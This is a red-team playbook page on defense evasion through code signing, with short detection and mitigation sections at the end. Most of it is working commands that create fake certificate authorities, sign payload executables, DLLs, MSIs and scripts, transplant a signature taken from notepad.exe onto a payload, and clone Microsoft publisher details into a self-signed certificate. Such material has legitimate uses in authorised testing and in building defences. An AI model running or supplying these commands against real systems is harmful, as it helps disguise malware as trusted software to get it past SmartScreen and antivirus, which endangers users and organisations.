% Filename: 06-red-teaming/initial-access/binary-signing.md
% Display name: Binary Signing
% Last update: 2026-02-11
% ATT&CK Tactics: TA0005 (Defense Evasion)
% ATT&CK Techniques: T1553.002 (Subvert Trust Controls: Code Signing)
% Authors: @TristanInSec

# Binary Signing

## Overview

Code signing uses digital certificates to assert that an executable comes from a trusted publisher. Windows SmartScreen, AV engines, and EDR products treat signed binaries with higher trust — flagging or blocking unsigned executables while allowing signed ones through. Red teams can self-sign payloads, use stolen certificates, or exploit trust chain weaknesses to bypass these controls.

## ATT&CK Mapping

- **Tactic:** TA0005 - Defense Evasion
- **Technique:** T1553.002 - Subvert Trust Controls: Code Signing

## Prerequisites

- OpenSSL (pre-installed on Kali)
- osslsigncode (`apt install osslsigncode`)

## Techniques

### How Authenticode Signing Works

```text
1. Developer obtains a code signing certificate from a CA
2. Binary is hashed (SHA-256)
3. Hash is signed with the developer's private key
4. Signature + certificate are embedded in the PE file
5. Windows verifies: certificate chain → CA trusted? → hash matches?

Trust levels:
  - EV (Extended Validation) certificate → SmartScreen trusts immediately
  - Standard certificate from trusted CA → SmartScreen builds reputation
  - Self-signed certificate → not trusted by default
  - Unsigned → flagged by SmartScreen, many AV products block
```

### Self-Signed Certificate Creation

```bash
# OpenSSL
# https://www.openssl.org/

# Generate CA key and certificate
openssl req -x509 -newkey rsa:4096 -keyout ca.key -out ca.crt -days 365 -nodes \
    -subj "/CN=Totally Legitimate CA/O=Trusted Corp/C=US"

# Generate code signing key and CSR
openssl req -newkey rsa:4096 -keyout signer.key -out signer.csr -nodes \
    -subj "/CN=Trusted Software Inc/O=Trusted Software/C=US"

# Sign the CSR with the CA (create code signing certificate)
openssl x509 -req -in signer.csr -CA ca.crt -CAkey ca.key -CAcreateserial \
    -out signer.crt -days 365 \
    -extfile <(echo "extendedKeyUsage = codeSigning")

# Create PKCS#12 bundle (certificate + private key)
openssl pkcs12 -export -out signer.pfx -inkey signer.key -in signer.crt -certfile ca.crt \
    -passout pass:password123
```

### Sign PE Files with osslsigncode

```bash
# osslsigncode
# https://github.com/mtrojnar/osslsigncode

# Sign an EXE using PKCS#12 certificate
osslsigncode sign -pkcs12 signer.pfx -pass password123 \
    -n "Trusted Application" -i "https://trusted-software.com" \
    -h sha256 -in payload.exe -out payload_signed.exe

# Sign using separate key and certificate files
osslsigncode sign -certs signer.crt -key signer.key \
    -n "Trusted Application" -h sha256 \
    -in payload.exe -out payload_signed.exe

# Add a timestamp (makes signature valid beyond cert expiry)
osslsigncode sign -pkcs12 signer.pfx -pass password123 \
    -n "Trusted Application" -h sha256 \
    -ts http://timestamp.digicert.com \
    -in payload.exe -out payload_signed.exe

# Verify a signature
osslsigncode verify payload_signed.exe

# Extract an existing signature from a legitimate binary
osslsigncode extract-signature -in legitimate.exe -out sig.pem

# Attach extracted signature to another binary (signature theft)
osslsigncode attach-signature -sigin sig.pem -in payload.exe -out payload_signed.exe
```

### Signature Theft (Catalog Signing Abuse)

```bash
# osslsigncode
# https://github.com/mtrojnar/osslsigncode

# Extract signature from a legitimately signed binary
osslsigncode extract-signature -in "C:\\Windows\\System32\\notepad.exe" -out notepad_sig.pem -pem

# Attach the stolen signature to the payload
osslsigncode attach-signature -sigin notepad_sig.pem -in payload.exe -out payload_signed.exe

# Note: The hash won't match, so full verification will fail
# But some security tools only check "is it signed?" not "is the signature valid?"
# This can bypass basic signature checks and SmartScreen in some cases
```

### Sign DLLs and MSI Files

```bash
# osslsigncode
# https://github.com/mtrojnar/osslsigncode

# osslsigncode supports: PE (EXE/DLL/SYS), CAB, CAT, MSI, APPX, PowerShell scripts

# Sign a DLL
osslsigncode sign -pkcs12 signer.pfx -pass password123 \
    -h sha256 -in payload.dll -out payload_signed.dll

# Sign an MSI installer
osslsigncode sign -pkcs12 signer.pfx -pass password123 \
    -n "Software Update" -h sha256 \
    -in payload.msi -out payload_signed.msi

# Sign a PowerShell script (.ps1)
osslsigncode sign -pkcs12 signer.pfx -pass password123 \
    -h sha256 -in script.ps1 -out script_signed.ps1
```

### Windows signtool (On Windows)

```bash
# signtool (part of Windows SDK)
# Used when operating from a Windows attack machine

# Sign with PFX
signtool sign /f signer.pfx /p password123 /fd SHA256 /tr http://timestamp.digicert.com /td SHA256 payload.exe

# Sign with certificate store
signtool sign /a /fd SHA256 /tr http://timestamp.digicert.com /td SHA256 payload.exe

# Verify signature
signtool verify /pa /v payload.exe
```

### Certificate Cloning

```bash
# Clone the certificate metadata from a legitimate signed binary
# Creates a self-signed cert that looks like the original publisher

# 1. Extract certificate info from a target binary
osslsigncode verify -in legitimate_signed.exe 2>&1 | grep -E "Subject|Issuer|Serial"

# 2. Create a certificate with matching Subject/Issuer fields
openssl req -x509 -newkey rsa:4096 -keyout clone_ca.key -out clone_ca.crt -days 365 -nodes \
    -subj "/CN=Microsoft Corporation/O=Microsoft Corporation/L=Redmond/ST=Washington/C=US"

openssl req -newkey rsa:4096 -keyout clone.key -out clone.csr -nodes \
    -subj "/CN=Microsoft Windows/O=Microsoft Corporation/L=Redmond/ST=Washington/C=US"

openssl x509 -req -in clone.csr -CA clone_ca.crt -CAkey clone_ca.key -CAcreateserial \
    -out clone.crt -days 365 \
    -extfile <(echo "extendedKeyUsage = codeSigning")

openssl pkcs12 -export -out clone.pfx -inkey clone.key -in clone.crt -certfile clone_ca.crt \
    -passout pass:password123

# 3. Sign payload with the cloned certificate
osslsigncode sign -pkcs12 clone.pfx -pass password123 \
    -n "Microsoft Windows" -h sha256 \
    -in payload.exe -out payload_signed.exe

# Note: The certificate chain will NOT validate against trusted root CAs
# This only fools tools that display the publisher name without validating the chain
```

## Signing Effectiveness

```text
Signing Method                  SmartScreen   AV Trust Boost   Chain Validates
──────────────────────────────  ────────────  ───────────────  ───────────────
EV cert (legitimate)            Bypassed      High             Yes
Standard cert (legitimate CA)   Reputation    Medium           Yes
Self-signed (trusted manually)  Blocked       Low              No
Self-signed (untrusted)         Blocked       None             No
Stolen signature (hash mismatch) Varies       Varies           No
Certificate cloning             Blocked       Low              No
Unsigned                        Blocked       None             N/A
```

## Detection Methods

### Host-Based Detection

- Certificate chain validation failures (self-signed or untrusted CA)
- Signature hash mismatches (stolen/attached signatures)
- Recently issued certificates from uncommon CAs
- Certificate metadata anomalies (cloned publisher names from non-Microsoft CAs)

### Network-Based Detection

- Certificate Transparency log monitoring for suspicious code signing certs
- OCSP/CRL check failures for revoked certificates

## Mitigation Strategies

- **Code integrity policies (WDAC)** — only allow binaries signed by specific trusted publishers
- **SmartScreen enforcement** — block unsigned and untrusted signed executables
- **Certificate pinning** — restrict which CAs can issue code signing certs for your org
- **WDAC supplemental policies** — audit mode first, then enforce

## References

### Official Documentation

- [osslsigncode](https://github.com/mtrojnar/osslsigncode)
- [OpenSSL](https://www.openssl.org/)

### MITRE ATT&CK

- [T1553.002 - Subvert Trust Controls: Code Signing](https://attack.mitre.org/techniques/T1553/002/)
